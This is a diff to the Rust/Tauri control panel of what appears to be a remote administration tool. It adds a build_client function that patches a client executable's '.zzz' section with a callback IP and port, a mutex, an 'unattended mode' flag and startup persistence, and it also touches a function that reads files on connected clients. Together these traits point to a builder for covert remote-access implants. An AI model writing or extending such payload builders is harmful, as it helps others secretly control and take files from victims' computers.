@@ -1,6 +1,16 @@
 use tauri::State;
 use crate::handlers::{ SharedServer, SharedTauriState, FrontClient, TauriState };
-use common::commands::{ Command, File, Process };
+use common::commands::{ Command, File as FileData, Process };
+
+use serde::{ Serialize, Deserialize };
+use object::{Object, ObjectSection};
+use std::error::Error;
+use std::fs::{self, File};
+use std::io::Write;
+use std::vec;
+
+
+use rmp_serde::Serializer;
 
 #[tauri::command]
 pub fn start_server(
@@ -28,6 +38,43 @@ pub fn start_server(
 pub fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> TauriState {
     let tauri_state = tauri_state.0.lock().unwrap();
     tauri_state.clone()
+}
+
+#[tauri::command]
+pub fn build_client(ip: &str, port: &str, mutex_enabled: bool, mutex: &str, unattended_mode: bool, startup: bool) {
+    let bin_data = fs::read("target/debug/client.exe").unwrap();
+    let file = object::File::parse(&*bin_data).unwrap();
+
+    let mut output_data = bin_data.clone();
+
+    let config = common::ClientConfig {
+        ip: ip.to_string(),
+        port: port.to_string(),
+        mutex_enabled,
+        mutex: mutex.to_string(),
+        unattended_mode,
+        startup
+    };
+
+    let mut buffer: Vec<u8> = Vec::new();
+
+    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();
+
+    let mut new_data = vec![0u8; 1024];
+
+    for (i, byte) in buffer.iter().enumerate() {
+        new_data[i] = *byte;
+    }
+
+    if let Some(section) = file.section_by_name(".zzz") {
+        let offset = section.file_range().unwrap().0 as usize;
+        let size = section.size() as usize;
+
+        output_data[offset..offset + size].copy_from_slice(&new_data);
+    }
+
+    let mut file = File::create("target/debug/Client_built.exe").unwrap();
+    let _ = file.write_all(&output_data);
 }
 
 #[tauri::command]
@@ -106,7 +153,7 @@ pub fn read_files(
     run: &str,
     path: &str,
     server_state: State<'_, SharedServer>
-) -> (String, Vec<File>) {
+) -> (String, Vec<FileData>) {
     let mut server = server_state.0.lock().unwrap();
 
     let client_id = id.parse::<usize>().unwrap();
